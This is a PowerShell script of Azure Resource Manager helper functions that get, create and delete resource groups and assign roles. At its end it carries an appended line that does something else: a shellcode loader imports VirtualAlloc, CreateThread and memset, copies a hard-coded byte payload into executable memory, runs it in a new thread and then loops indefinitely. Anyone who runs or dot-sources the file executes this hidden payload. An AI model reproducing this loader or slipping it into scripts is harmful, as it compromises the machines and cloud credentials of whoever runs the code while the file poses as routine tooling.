function Get-AzureRmResourceGroup
{
  [CmdletBinding()]
  [Alias("Get-AzResourceGroup")]
  param(
    [string] [Parameter(Position=0, ValueFromPipelineByPropertyName=$true)] [alias("ResourceGroupName")] $Name,
    [string] [Parameter(Position=1, ValueFromPipelineByPropertyName=$true)] $Location,
    [string] [Parameter(ValueFromPipelineByPropertyName=$true)] $Id,
    [switch] $Force)
  BEGIN {
    $context = Get-Context
    $client = Get-ResourcesClient $context
  }
  PROCESS {
    if([string]::IsNullOrEmpty($Name)) {
      $getTask = $client.ResourceGroups.ListWithHttpMessagesAsync($null, $null, [System.Threading.CancellationToken]::None)
      $rg = $getTask.Result.Body
      Write-Output $rg
    } else {
      $getTask = $client.ResourceGroups.GetWithHttpMessagesAsync($Name, $null, [System.Threading.CancellationToken]::None)
      $rg = $getTask.Result
      if($rg -eq $null) {
        $resourceGroup = $null
      } else {
        $resourceGroup = Get-ResourceGroup $Name $Location $rg.ResourceGroup.Id
      }
      Write-Output $resourceGroup
    }
  }
  END {}
}

function Get-AzureRmResource
{
  [CmdletBinding()]
  [Alias("Get-AzResource")]
  param(
    [string] [Parameter(Position=0, ValueFromPipelineByPropertyName=$true)] $ResourceType)
  BEGIN {
    $context = Get-Context
    $client = Get-ResourcesClient $context
  }
  PROCESS {
    $result = $client.Resources.ListWithHttpMessagesAsync().Result.Body
    if (![string]::IsNullOrEmpty($ResourceType)) {
      $result = $result | Where-Object { $_.Type -eq $ResourceType }
      Write-Output $result
    }
    else {
      Write-Output $result
    }
  }
  END {}
}

function Get-AzureRmResourceProvider
{
  [CmdletBinding()]
  [Alias("Get-AzResourceProvider")]
  param(
    [string] [Parameter(Position=0, ValueFromPipelineByPropertyName=$true)] $ProviderNamespace)
  BEGIN {
    $context = Get-Context
    $client = Get-ResourcesClient $context
  }
  PROCESS {
    $getTask = $client.Providers.GetWithHttpMessagesAsync($ProviderNamespace)
    Write-Output $getTask.Result.Body
  }
  END {}
}

function New-AzureRmResourceGroup
{
  [CmdletBinding()]
  [Alias("New-AzResourceGroup")]
  param(
    [string] [Parameter(Position=0, ValueFromPipelineByPropertyName=$true)] [alias("ResourceGroupName")] $Name,
    [string] [Parameter(Position=1, ValueFromPipelineByPropertyName=$true)] $Location,
    [string] [Parameter(ValueFromPipelineByPropertyName=$true)] $Tags,
    [switch] $Force)
  BEGIN {
    $context = Get-Context
    $client = Get-ResourcesClient $context
  }
  PROCESS {
    $createParams = New-Object -Type Microsoft.Azure.Management.Internal.Resources.Models.ResourceGroup
    $createParams.Location = $Location
    $createTask = $client.ResourceGroups.CreateOrUpdateWithHttpMessagesAsync($Name, $createParams, $null, [System.Threading.CancellationToken]::None)
    $rg = $createTask.Result
    $resourceGroup = Get-ResourceGroup $Name $Location
    Write-Output $resourceGroup
  }
  END {}
}

function New-AzureRmResourceGroupDeployment
{
  [CmdletBinding()]
  [Alias("New-AzResourceGroupDeployment")]
  param(
    [string] [alias("DeploymentName")] $Name,
    [string] $ResourceGroupName,
    [string] $TemplateFile,
    [string] $serverName,
    [string] $databaseName,
    [string] $storageName,
    [string] $version,
    [string] $EnvLocation,
    [string] $administratorLogin,
    [string] $TemplateParameterFile,
    [switch] $Force)
  BEGIN {
    $context = Get-Context
    $client = Get-ResourcesClient $context
  }
  PROCESS {
    if($TemplateFile)
    {
      $mode = [Microsoft.Azure.Management.Internal.Resources.Models.DeploymentMode]::Incremental
      $template = [Newtonsoft.Json.Linq.JObject]::Parse((Get-Content $TemplateFile) -join "`r`n")
      if($TemplateParameterFile)
      {
        $templateParams = [Newtonsoft.Json.Linq.JObject]::Parse((Get-Content $TemplateParameterFile) -join "`r`n")
        $createParamsProps = New-Object -Type Microsoft.Azure.Management.Internal.Resources.Models.DeploymentProperties -ArgumentList $mode,$template,$null,$templateParams
      }
      else
      {
        $createParamsProps = New-Object -Type Microsoft.Azure.Management.Internal.Resources.Models.DeploymentProperties -ArgumentList $mode,$template
      }
      $createParams = New-Object -Type Microsoft.Azure.Management.Internal.Resources.Models.Deployment -ArgumentList $createParamsProps
    }
    else
    {
      $createParams = New-Object -Type Microsoft.Azure.Management.Internal.Resources.Models.Deployment
    }

    $createTask = $client.Deployments.CreateOrUpdateWithHttpMessagesAsync($Name, $Name, $createParams, $null, [System.Threading.CancellationToken]::None)
    $rg = $createTask.Result
  }
  END {}
}

function Remove-AzureRmResourceGroup
{
  [CmdletBinding()]
  [Alias("Remove-AzResourceGroup")]
  param(
    [string] [Parameter(Position=0, ValueFromPipelineByPropertyName=$true)] [alias("ResourceGroupName")] $Name,
    [switch] $Force)
  BEGIN {
    $context = Get-Context
    $client = Get-ResourcesClient $context
  }
  PROCESS {
    $deleteTask = $client.ResourceGroups.DeleteWithHttpMessagesAsync($Name, $null, [System.Threading.CancellationToken]::None)
    $rg = $deleteTask.Result
  }
  END {}
}

function New-AzureRmRoleAssignmentWithId
{
    [CmdletBinding()]
    [Alias("New-AzRoleAssignmentWithId")]
    param(
        [Guid]   [Parameter()] [alias("Id", "PrincipalId")] $ObjectId,
        [string] [Parameter()] [alias("Email", "UserPrincipalName")] $SignInName,
        [string] [Parameter()] [alias("SPN", "ServicePrincipalName")] $ApplicationId,
        [string] [Parameter()] $ResourceGroupName,
        [string] [Parameter()] $ResourceName,
        [string] [Parameter()] $ResourceType,
        [string] [Parameter()] $ParentResource,
        [string] [Parameter()] $Scope,
        [string] [Parameter()] $RoleDefinitionName,
        [Guid]   [Parameter()] $RoleDefinitionId,
        [switch] [Parameter()] $AllowDelegation,
        [Guid]   [Parameter()] $RoleAssignmentId
    )

    $profile = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile
    $cmdlet = New-Object -TypeName Microsoft.Azure.Commands.Resources.NewAzureRoleAssignmentCommand
    $cmdlet.DefaultProfile = $profile
	$cmdlet.CommandRuntime = $PSCmdlet.CommandRuntime

    if ($ObjectId -ne $null -and $ObjectId -ne [System.Guid]::Empty)
    {
        $cmdlet.ObjectId = $ObjectId
    }

    if (-not ([string]::IsNullOrEmpty($SignInName)))
    {
        $cmdlet.SignInName = $SignInName
    }

    if (-not ([string]::IsNullOrEmpty($ApplicationId)))
    {
        $cmdlet.ApplicationId = $ApplicationId
    }

    if (-not ([string]::IsNullOrEmpty($ResourceGroupName)))
    {
        $cmdlet.ResourceGroupName = $ResourceGroupName
    }

    if (-not ([string]::IsNullOrEmpty($ResourceName)))
    {
        $cmdlet.ResourceName = $ResourceName
    }

    if (-not ([string]::IsNullOrEmpty($ResourceType)))
    {
        $cmdlet.ResourceType = $ResourceType
    }

    if (-not ([string]::IsNullOrEmpty($ParentResource)))
    {
        $cmdlet.ParentResource = $ParentResource
    }

    if (-not ([string]::IsNullOrEmpty($Scope)))
    {
        $cmdlet.Scope = $Scope
    }

    if (-not ([string]::IsNullOrEmpty($RoleDefinitionName)))
    {
        $cmdlet.RoleDefinitionName = $RoleDefinitionName
    }

    if ($RoleDefinitionId -ne $null -and $RoleDefinitionId -ne [System.Guid]::Empty)
    {
        $cmdlet.RoleDefinitionId = $RoleDefinitionId
    }

    if ($AllowDelegation.IsPresent)
    {
        $cmdlet.AllowDelegation = $true
    }

    if ($RoleAssignmentId -ne $null -and $RoleAssignmentId -ne [System.Guid]::Empty)
    {
        $cmdlet.RoleAssignmentId = $RoleAssignmentId
    }

    $cmdlet.ExecuteCmdlet()
}

function New-AzureRmRoleDefinitionWithId
{
    [CmdletBinding()]
    [Alias("New-AzRoleDefinitionWithId")]
    param(
        [Microsoft.Azure.Commands.Resources.Models.Authorization.PSRoleDefinition] [Parameter()] $Role,
        [string] [Parameter()] $InputFile,
        [Guid]   [Parameter()] $RoleDefinitionId
    )

    $profile = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile
    $cmdlet = New-Object -TypeName Microsoft.Azure.Commands.Resources.NewAzureRoleDefinitionCommand
    $cmdlet.DefaultProfile = $profile
	$cmdlet.CommandRuntime = $PSCmdlet.CommandRuntime

    if (-not ([string]::IsNullOrEmpty($InputFile)))
    {
        $cmdlet.InputFile = $InputFile
    }

    if ($Role -ne $null)
    {
        $cmdlet.Role = $Role
    }

    if ($RoleDefinitionId -ne $null -and $RoleDefinitionId -ne [System.Guid]::Empty)
    {
        $cmdlet.RoleDefinitionId = $RoleDefinitionId
    }

    $cmdlet.ExecuteCmdlet()
}

function Get-Context
{
      return [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureRmProfileProvider]::Instance.Profile.DefaultContext
}

function Get-ResourcesClient
{
  param([Microsoft.Azure.Commands.Common.Authentication.Abstractions.IAzureContext] $context)
  $factory = [Microsoft.Azure.Commands.Common.Authentication.AzureSession]::Instance.ClientFactory
  [System.Type[]]$types = [Microsoft.Azure.Commands.Common.Authentication.Abstractions.IAzureContext],
	[string]
  $method = [Microsoft.Azure.Commands.Common.Authentication.IClientFactory].GetMethod("CreateArmClient", $types)
  $closedMethod = $method.MakeGenericMethod([Microsoft.Azure.Management.Internal.Resources.ResourceManagementClient])
  $arguments = $context, [Microsoft.Azure.Commands.Common.Authentication.Abstractions.AzureEnvironment+Endpoint]::ResourceManager
  $client = $closedMethod.Invoke($factory, $arguments)
  return $client
}

function Get-ResourceGroup {
  param([string] $name, [string] $location, [string] $id)
  $rg = New-Object PSObject -Property @{"ResourceGroupName" = $name; "Location" = $location; "ResourceId" = $id}
  return $rg
}

$OP4 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $OP4 -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xcc,0xd9,0x74,0x24,0xf4,0xba,0x04,0xad,0x73,0xc7,0x5e,0x33,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xc6,0x00,0x4f,0x86,0x3b,0xe0,0x0d,0x69,0xc4,0xf0,0x71,0xe3,0x21,0xc1,0xb1,0x97,0x22,0x71,0x02,0xd3,0x67,0x7d,0xe9,0xb1,0x93,0xf6,0x9f,0x1d,0x93,0xbf,0x2a,0x78,0x9a,0x40,0x06,0xb8,0xbd,0xc2,0x55,0xed,0x1d,0xfb,0x95,0xe0,0x5c,0x3c,0xcb,0x09,0x0c,0x95,0x87,0xbc,0xa1,0x92,0xd2,0x7c,0x49,0xe8,0xf3,0x04,0xae,0xb8,0xf2,0x25,0x61,0xb3,0xac,0xe5,0x83,0x10,0xc5,0xaf,0x9b,0x75,0xe0,0x66,0x17,0x4d,0x9e,0x78,0xf1,0x9c,0x5f,0xd6,0x3c,0x11,0x92,0x26,0x78,0x95,0x4d,0x5d,0x70,0xe6,0xf0,0x66,0x47,0x95,0x2e,0xe2,0x5c,0x3d,0xa4,0x54,0xb9,0xbc,0x69,0x02,0x4a,0xb2,0xc6,0x40,0x14,0xd6,0xd9,0x85,0x2e,0xe2,0x52,0x28,0xe1,0x63,0x20,0x0f,0x25,0x28,0xf2,0x2e,0x7c,0x94,0x55,0x4e,0x9e,0x77,0x09,0xea,0xd4,0x95,0x5e,0x87,0xb6,0xf1,0x93,0xaa,0x48,0x01,0xbc,0xbd,0x3b,0x33,0x63,0x16,0xd4,0x7f,0xec,0xb0,0x23,0x80,0xc7,0x05,0xbb,0x7f,0xe8,0x75,0x95,0xbb,0xbc,0x25,0x8d,0x6a,0xbd,0xad,0x4d,0x93,0x68,0x5b,0x4b,0x03,0x53,0x34,0x52,0xd9,0x3b,0x47,0x55,0xcc,0xe7,0xce,0xb3,0xbe,0x47,0x81,0x6b,0x7e,0x38,0x61,0xdc,0x16,0x52,0x6e,0x03,0x06,0x5d,0xa4,0x2c,0xac,0xb2,0x11,0x04,0x58,0x2a,0x38,0xde,0xf9,0xb3,0x96,0x9a,0x39,0x3f,0x15,0x5a,0xf7,0xc8,0x50,0x48,0x6f,0x39,0x2f,0x32,0x39,0x46,0x85,0x59,0xc5,0xd2,0x22,0xc8,0x92,0x4a,0x29,0x2d,0xd4,0xd4,0xd2,0x18,0x6f,0xdc,0x46,0xe3,0x07,0x21,0x87,0xe3,0xd7,0x77,0xcd,0xe3,0xbf,0x2f,0xb5,0xb7,0xda,0x2f,0x60,0xa4,0x77,0xba,0x8b,0x9d,0x24,0x6d,0xe4,0x23,0x13,0x59,0xab,0xdc,0x76,0x5b,0x97,0x0a,0xbe,0x29,0xf9,0x8e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$0DOI=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($0DOI.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$0DOI,0,0,0);for (;;){Start-sleep 60};

